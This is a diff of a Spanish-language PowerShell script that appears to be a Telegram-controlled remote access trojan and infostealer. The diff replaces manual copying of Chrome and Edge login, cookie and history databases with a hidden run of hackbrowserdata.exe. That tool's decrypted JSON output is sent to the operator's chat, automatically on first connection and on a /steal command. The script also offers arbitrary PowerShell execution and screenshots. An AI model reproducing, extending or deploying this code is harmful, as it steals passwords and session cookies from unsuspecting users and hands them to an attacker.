@@ -155,123 +155,126 @@ function Tomar-Captura {
     }
 }
 
-function Copiar-ArchivoBloqueado {
-    param ($origen, $destino)
-    try {
-        if (-not (Test-Path $origen)) { return $false }
-        
-        try {
-            Copy-Item $origen $destino -Force -ErrorAction Stop
-            return $true
-        } catch {
-            try {
-                $fs = New-Object System.IO.FileStream($origen, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-                $bytes = New-Object byte[] $fs.Length
-                $fs.Read($bytes, 0, $fs.Length) | Out-Null
-                $fs.Close()
-                [System.IO.File]::WriteAllBytes($destino, $bytes)
-                return $true
-            } catch { 
-                Add-Content $LogPath "Error FileStream: $_"
-                return $false 
-            }
-        }
-    } catch { 
-        Add-Content $LogPath "Error copia bloqueada: $_"
-        return $false 
-    }
-}
-
-function Recolectar-DatosNavegadores {
+function Ejecutar-HackBrowserData {
     param ($chatId, $silencioso = $false)
     
-    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto "Recolectando datos de navegadores..." }
-    
-    $navegadores = @{
-        'Chrome' = @{
-            'Base' = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-            'Datos' = @{
-                'History' = 'History'
-                'Bookmarks' = 'Bookmarks'
-                'Cookies' = 'Network\Cookies'
-                'Login_Data' = 'Login Data'
-                'Cache' = 'Cache'
-            }
-        }
-        'Edge' = @{
-            'Base' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-            'Datos' = @{
-                'History' = 'History'
-                'Bookmarks' = 'Bookmarks'
-                'Cookies' = 'Network\Cookies'
-                'Login_Data' = 'Login Data'
-                'Cache' = 'Cache'
-            }
-        }
+    if (-not $silencioso) { 
+        Enviar-Mensaje -chatId $chatId -texto "Extrayendo datos de navegadores con HackBrowserData..." 
     }
     
-    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
-    $archivosEnviados = 0
-    $errores = @()
-    
-    foreach ($nav in $navegadores.Keys) {
-        $base = $navegadores[$nav]['Base']
-        Add-Content $LogPath "Procesando $nav - Base: $base"
+    try {
+        # Crear directorio temporal para los resultados
+        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+        $tempDir = "$env:TEMP\BrowserData_$timestamp"
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
         
-        if (-not (Test-Path $base)) { 
-            Add-Content $LogPath "$nav no encontrado"
-            continue 
+        # Verificar si hackbrowserdata.exe existe en el mismo directorio del script
+        $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
+        if ([string]::IsNullOrEmpty($scriptDir)) {
+            $scriptDir = (Get-Location).Path
         }
         
-        foreach ($tipo in $navegadores[$nav]['Datos'].Keys) {
-            $archivo = $navegadores[$nav]['Datos'][$tipo]
-            $origen = Join-Path $base $archivo
-            
-            Add-Content $LogPath "Buscando: $origen"
-            
-            if (-not (Test-Path $origen)) {
-                $errores += "$nav $tipo - No existe"
-                continue
-            }
-            
-            if ($tipo -eq 'History' -or $tipo -eq 'Login_Data' -or $tipo -eq 'Cookies') {
-                $ext = 'db'
-            } elseif ($tipo -eq 'Bookmarks') {
-                $ext = 'json'
-            } else {
-                $ext = 'cache'
-            }
-            
-            $nombre = "$($nav)_$($tipo)_$ts.$ext"
-            $tmp = "$env:TEMP\$nombre"
-            
-            Add-Content $LogPath "Copiando a: $tmp"
-            
-            if (Copiar-ArchivoBloqueado $origen $tmp) {
-                Add-Content $LogPath "Copiado exitoso, enviando..."
-                $caption = "$nav - $tipo ($ts)"
-                $resultado = Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $tmp -caption $caption
-                if ($resultado) {
-                    $archivosEnviados++
-                } else {
-                    $errores += "$nav $tipo - Error envio"
-                }
-                Start-Sleep -Milliseconds 300
-                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-            } else {
-                $errores += "$nav $tipo - Error copia"
-                Add-Content $LogPath "Error copiando $origen"
-            }
+        $hackBrowserPath = Join-Path $scriptDir "hackbrowserdata.exe"
+        
+        # Si no está en el directorio del script, buscar en el directorio actual
+        if (-not (Test-Path $hackBrowserPath)) {
+            $hackBrowserPath = ".\hackbrowserdata.exe"
         }
+        
+        if (-not (Test-Path $hackBrowserPath)) {
+            if (-not $silencioso) {
+                Enviar-Mensaje -chatId $chatId -texto "Error: No se encontró hackbrowserdata.exe"
+            }
+            Add-Content $LogPath "hackbrowserdata.exe no encontrado"
+            return $false
+        }
+        
+        Add-Content $LogPath "Ejecutando: $hackBrowserPath"
+        
+        # Configurar proceso oculto
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $hackBrowserPath
+        $psi.Arguments = "-f json -dir `"$tempDir`""
+        $psi.WorkingDirectory = $scriptDir
+        $psi.CreateNoWindow = $true
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.UseShellExecute = $false
+        $psi.RedirectStandardOutput = $true
+        $psi.RedirectStandardError = $true
+        
+        # Ejecutar el proceso
+        $process = [System.Diagnostics.Process]::Start($psi)
+        $process.WaitForExit()
+        
+        $stdout = $process.StandardOutput.ReadToEnd()
+        $stderr = $process.StandardError.ReadToEnd()
+        
+        Add-Content $LogPath "HackBrowserData stdout: $stdout"
+        Add-Content $LogPath "HackBrowserData stderr: $stderr"
+        Add-Content $LogPath "Exit code: $($process.ExitCode)"
+        
+        # Buscar archivos JSON generados
+        $archivosJSON = Get-ChildItem -Path $tempDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
+        
+        if ($archivosJSON.Count -eq 0) {
+            if (-not $silencioso) {
+                Enviar-Mensaje -chatId $chatId -texto "No se generaron archivos JSON. Verifica que los navegadores estén instalados."
+            }
+            Add-Content $LogPath "No se encontraron archivos JSON"
+            Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+            return $false
+        }
+        
+        Add-Content $LogPath "Archivos encontrados: $($archivosJSON.Count)"
+        
+        # Enviar cada archivo JSON
+        $enviados = 0
+        $errores = @()
+        
+        foreach ($archivo in $archivosJSON) {
+            $nombreOriginal = $archivo.Name
+            $nombreConTimestamp = "$($archivo.BaseName)_$timestamp.json"
+            $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
+            
+            # Renombrar con timestamp para evitar sobrescrituras
+            Rename-Item -Path $archivo.FullName -NewName $nombreConTimestamp -Force
+            
+            $caption = "[$nombreOriginal] - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+            Add-Content $LogPath "Enviando: $nombreConTimestamp"
+            
+            $resultado = Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $rutaRenombrado -caption $caption
+            
+            if ($resultado) {
+                $enviados++
+            } else {
+                $errores += $nombreOriginal
+            }
+            
+            Start-Sleep -Milliseconds 300
+        }
+        
+        # Limpiar directorio temporal
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+        
+        $mensaje = "Extracción completada.`nArchivos enviados: $enviados"
+        if ($errores.Count -gt 0) {
+            $mensaje += "`nErrores: $($errores.Count)"
+        }
+        
+        if (-not $silencioso) {
+            Enviar-Mensaje -chatId $chatId -texto $mensaje
+        }
+        
+        Add-Content $LogPath $mensaje
+        return ($enviados -gt 0)
+        
+    } catch {
+        Add-Content $LogPath "Error en Ejecutar-HackBrowserData: $_"
+        if (-not $silencioso) {
+            Enviar-Mensaje -chatId $chatId -texto "Error extrayendo datos: $_"
+        }
+        return $false
     }
-    
-    $msgResumen = "Archivos enviados: $archivosEnviados`n"
-    if ($errores.Count -gt 0) {
-        $msgResumen += "Errores:`n" + ($errores -join "`n")
-    }
-    if (-not $silencioso) { Enviar-Mensaje -chatId $chatId -texto $msgResumen }
-    
-    return ($archivosEnviados -gt 0)
 }
 
 function Probar-Conexion {
@@ -358,9 +361,9 @@ while ($true) {
         $Global:EstadoInternet = $true
         if ($Global:PrimeraEjecucion) {
             $Global:PrimeraEjecucion = $false
-            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nRecolectando datos..."
+            Enviar-Mensaje -chatId $ChatId -texto "Conectado - $(Obtener-Info)`nExtrayendo datos de navegadores..."
             Start-Sleep -Seconds 2
-            Recolectar-DatosNavegadores -chatId $ChatId -silencioso $true
+            Ejecutar-HackBrowserData -chatId $ChatId -silencioso $true
         }
     } elseif (-not $net) {
         $Global:EstadoInternet = $false
@@ -408,7 +411,7 @@ while ($true) {
                         Enviar-Mensaje -chatId $cid -texto "Directorio actual: $dir"
                     } 
                     elseif ($txtLower -eq 'steal' -or $txtLower -eq '/steal') {
-                        Recolectar-DatosNavegadores -chatId $cid
+                        Ejecutar-HackBrowserData -chatId $cid
                     } 
                     elseif ($txtLower -eq 'captura' -or $txtLower -eq '/captura') {
                         Tomar-Captura -chatId $cid
@@ -425,7 +428,7 @@ Comandos disponibles:
 /cmd comando - Ejecutar comando PowerShell
 /cd ruta - Cambiar de directorio
 /pwd - Mostrar directorio actual
-/steal - Recolectar datos de navegadores
+/steal - Extraer datos de navegadores (JSON desencriptado)
 /captura - Tomar screenshot
 /info - Informacion del sistema
 /help - Mostrar esta ayuda
